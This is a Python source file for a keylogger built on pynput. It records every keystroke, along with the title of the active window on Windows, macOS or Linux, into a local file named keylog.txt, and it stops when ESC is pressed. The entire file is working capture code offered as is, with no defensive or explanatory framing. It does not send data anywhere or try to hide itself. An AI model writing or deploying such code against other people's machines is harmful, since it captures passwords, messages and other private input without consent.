import logging
from datetime import datetime
from pynput.keyboard import Key, Listener
import os
import platform

# Setup logging configuration
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

keys = []
current_window = None

def get_active_window():
    if platform.system() == 'Windows':
        try:
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except ImportError:
            return "Unknown Window"
    elif platform.system() == 'Darwin':
        try:
            from AppKit import NSWorkspace
            return NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()
        except ImportError:
            return "Unknown Window"
    elif platform.system() == 'Linux':
        try:
            import subprocess
            window = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname'])
            return window.decode('utf-8').strip()
        except Exception:
            return "Unknown Window"
    return "Unknown Window"

def on_key_press(key):
    global keys, current_window
    new_window = get_active_window()
    if new_window != current_window:
        current_window = new_window
        log_active_window(new_window)
    keys.append(key)
    write_log(key)

def log_active_window(window_title):
    with open('keylog.txt', 'a') as log:
        log.write(f'\n\n[{datetime.now()}] Active Window: {window_title}\n')

def write_log(key):
    with open('keylog.txt', 'a') as log:
        if hasattr(key, 'char'):
            log.write(key.char)
        elif key == Key.space:
            log.write(' ')
        elif key == Key.enter:
            log.write('\n')
        elif key == Key.tab:
            log.write('\t')
        else:
            log.write(f'[{str(key)}]')
    logging.info(f"Key pressed: {key}")

def on_key_release(key):
    if key == Key.esc:
        return False

def setup_logging():
    log_dir = os.path.dirname(os.path.abspath(__file__))
    log_path = os.path.join(log_dir, 'keylog.txt')
    logging.basicConfig(filename=log_path, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def print_start_message():
    print("""
    Keylogger started...
    Press ESC to stop logging.
    Logging keys to keylog.txt.
    """)

if __name__ == "__main__":
    setup_logging()
    print_start_message()

    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()
